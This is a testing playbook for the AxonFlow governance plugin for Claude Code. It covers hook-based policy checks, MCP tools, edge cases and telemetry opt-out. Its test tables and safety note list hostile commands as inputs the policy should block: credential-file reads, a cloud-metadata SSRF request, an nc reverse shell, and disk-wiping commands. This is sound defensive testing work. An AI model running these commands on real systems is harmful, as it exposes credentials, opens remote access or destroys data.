# Claude Code Plugin — E2E Testing Playbook

Standard operating procedure for testing the AxonFlow Claude Code plugin.
Covers hook-based governance (automatic), MCP tools (explicit), and edge cases.

---

## Prerequisites

1. **AxonFlow running** (community or enterprise mode)
2. **Plugin cloned** to a known location
3. `jq` and `curl` installed

## Setup

### Option A: Use the E2E setup script (recommended)

```bash
cd /path/to/axonflow-enterprise
./scripts/setup-e2e-testing.sh community
source /tmp/axonflow-e2e-env.sh
```

This fetches LLM API keys from AWS Secrets Manager, starts Docker compose,
and verifies health. Sets `DO_NOT_TRACK=1` to suppress telemetry during testing.

### Option B: Manual setup

```bash
# Start AxonFlow
cd /path/to/axonflow-enterprise
docker compose up -d

# Wait for health
curl -s http://localhost:8080/health | jq .status

# Set environment
export AXONFLOW_ENDPOINT=http://localhost:8080
export AXONFLOW_AUTH=""  # empty for community mode (no Basic auth needed)
```

### Launch Claude Code with plugin

```bash
# CLAUDE_PLUGIN_ROOT must be set — --plugin-dir does not set it automatically,
# and hooks need it to find their scripts.
export CLAUDE_PLUGIN_ROOT=/path/to/axonflow-claude-plugin
claude --plugin-dir /path/to/axonflow-claude-plugin
```

**Verify on startup:**
- `2 hooks loaded` (PreToolUse + PostToolUse)
- `MCP server "axonflow" connected` with `6 tools`

If MCP tools don't appear, check:
- `AXONFLOW_ENDPOINT` is reachable from your shell
- Agent health endpoint returns `healthy`
- For enterprise mode: `AXONFLOW_AUTH` must be base64 of `clientId:clientSecret`

---

## Test Matrix

### 1. Hook-based governance (automatic — fires on every tool call)

These tests verify PreToolUse (policy check) and PostToolUse (audit + PII scan).

| # | What to ask Claude | Expected behavior | What to verify |
|---|---|---|---|
| 1.1 | "Run `echo hello world` in bash" | Allowed, audit logged | Command executes normally. Agent logs show audit entry. |
| 1.2 | "Run `ls /tmp` in bash" | Allowed, audit logged | Normal execution. |
| 1.3 | "Create a file `/tmp/test-policy.txt` with content `Hello`" | Allowed | Write tool fires, PostToolUse audits. |
| 1.4 | "Run `cat /etc/passwd` in bash" | Blocked by path traversal policy | PreToolUse returns deny. Claude shows block reason. |
| 1.5 | "Write a file `/tmp/pii-test.txt` with content `Patient SSN is 123-45-6789`" | Allowed, PII flagged | PostToolUse scans output and reports PII detection. |
| 1.6 | "Run `curl http://169.254.169.254/latest/meta-data/`" | Blocked by SSRF policy | PreToolUse returns deny (cloud metadata endpoint). |

**Important safety note:** Never ask Claude to run truly destructive commands
like `rm -rf /` or `dd if=/dev/zero of=/dev/sda`. Claude may refuse to use the
tool at all (correctly), or worse, it may try to run it. Use safe equivalents:
- Instead of `rm -rf /`: use `cat /etc/shadow` (blocked by credential policy)
- Instead of `dd if=... of=/dev/sda`: use `curl 169.254.169.254` (blocked by SSRF policy)
- To test reverse shell blocking: `echo "nc -e /bin/bash 10.0.0.1 4444"` as a Write to a file

### 2. MCP tools (explicit — ask Claude to use specific tools)

These tests verify the 6 MCP tools are discoverable and functional.

| # | What to ask Claude | Expected result |
|---|---|---|
| 2.1 | "Use the axonflow check_policy tool to check if `curl http://169.254.169.254` is allowed for connector_type `claude_code.Bash`" | Returns `allowed: false` with block reason (SSRF) |
| 2.2 | "Use axonflow check_policy to check if `echo hello` is allowed for connector_type `claude_code.Bash`" | Returns `allowed: true` |
| 2.3 | "Use axonflow check_output to scan this text for PII: `Patient SSN is 123-45-6789`" | Returns PII detection, redaction applied |
| 2.4 | "Use axonflow check_output to scan: `The weather is sunny today`" | Returns clean, no PII |
| 2.5 | "Use axonflow list_policies to show active governance policies" | Returns list of 80+ policies with names, categories, patterns |
| 2.6 | "Use axonflow get_policy_stats to show governance activity" | Returns summary: total checks, blocks, allows |
| 2.7 | "Use axonflow search_audit_events to show recent audit events from the last hour" | Returns array of audit entries |
| 2.8 | "Use axonflow audit_tool_call to record that I ran `echo test` successfully" | Returns `recorded: true` |

### 3. Integration policy activation

| # | How to test | Expected result |
|---|---|---|
| 3.1 | Set `AXONFLOW_INTEGRATIONS=claude-code` in docker-compose env, restart | Agent logs: "Activated Claude Code: 2 policies enabled" |
| 3.2 | After 3.1, use `list_policies` and filter for `int_claude` | Shows `int_claude_settings` and `int_claude_hooks` policies |
| 3.3 | Without env var, just connect the plugin | Auto-detect from MCP clientInfo: agent logs "Activated Claude Code" |

### 4. Edge cases

| # | Scenario | Expected |
|---|---|---|
| 4.1 | Kill AxonFlow while plugin is connected | Hooks fail-open on network errors (commands still execute). MCP tools return errors. |
| 4.2 | Set invalid `AXONFLOW_AUTH` in enterprise mode | MCP initialize fails, tools unavailable. Hooks fail-closed (auth/config errors produce a deny decision, blocking tool calls). |
| 4.3 | Restart AxonFlow while plugin is connected | Session expires, new session auto-created on next request. |

---

## Automated tests (no Claude Code needed)

### Hook regression tests (mock server)

```bash
cd /path/to/axonflow-claude-plugin
./tests/test-hooks.sh           # Mock server (offline, fast)
./tests/test-hooks.sh --live    # Live AxonFlow (requires running instance)
```

### Live MCP endpoint verification

```bash
# Initialize session
curl -s -X POST $AXONFLOW_ENDPOINT/api/v1/mcp-server \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":"1","method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"claude-code","version":"1.0.0"}}}'

# List tools (use session ID from above response header)
curl -s -X POST $AXONFLOW_ENDPOINT/api/v1/mcp-server \
  -H "Content-Type: application/json" \
  -H "Mcp-Session-Id: <session-id>" \
  -d '{"jsonrpc":"2.0","id":"2","method":"tools/list","params":{}}'

# Call check_policy
curl -s -X POST $AXONFLOW_ENDPOINT/api/v1/mcp-server \
  -H "Content-Type: application/json" \
  -H "Mcp-Session-Id: <session-id>" \
  -d '{"jsonrpc":"2.0","id":"3","method":"tools/call","params":{"name":"check_policy","arguments":{"connector_type":"claude_code.Bash","statement":"curl http://169.254.169.254"}}}'
```

---

## 5. Telemetry Verification

### 5.1 First-invocation telemetry ping
1. Delete stamp file: `rm -f ~/.cache/axonflow/claude-code-plugin-telemetry-sent`
2. Run any governed tool (e.g., `echo hello` via Bash)
3. Verify stamp file created: `ls -la ~/.cache/axonflow/claude-code-plugin-telemetry-sent`
4. Verify stamp file contains a UUID: `cat ~/.cache/axonflow/claude-code-plugin-telemetry-sent`

### 5.2 Subsequent invocations skip telemetry
1. With stamp file present, run another governed tool
2. No new HTTP request to checkpoint (verify via network monitor or AxonFlow logs)

### 5.3 Opt-out verification (DO_NOT_TRACK)
1. Delete stamp file: `rm -f ~/.cache/axonflow/claude-code-plugin-telemetry-sent`
2. Set `export DO_NOT_TRACK=1`
3. Run a governed tool
4. Verify NO stamp file created: `ls ~/.cache/axonflow/claude-code-plugin-telemetry-sent` should fail

### 5.4 Opt-out verification (AXONFLOW_TELEMETRY)
1. Same as 5.3 but with `export AXONFLOW_TELEMETRY=off` instead of `DO_NOT_TRACK`

---

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| "0 hooks loaded" | Plugin path wrong or hooks.json missing | Check `--plugin` path points to repo root with `hooks/hooks.json` |
| "MCP connected" but 0 tools | Protocol version mismatch | Upgrade AxonFlow to version with legacy protocol support |
| Hooks work but MCP tools fail | Auth mismatch | Check `AXONFLOW_AUTH` env var (must be base64 of `clientId:clientSecret` for enterprise) |
| OAuth 404 errors | MCP initialize failed, Claude Code falls back to OAuth discovery | Check AxonFlow logs for auth errors on `/api/v1/mcp-server` |
| Dangerous commands not blocked | Migration 059 not applied | Check `docker logs axonflow-agent` for migration 059. If missing, rebuild image. |
| All commands blocked | Overly broad policy pattern | Check `list_policies` output, look for catch-all patterns |
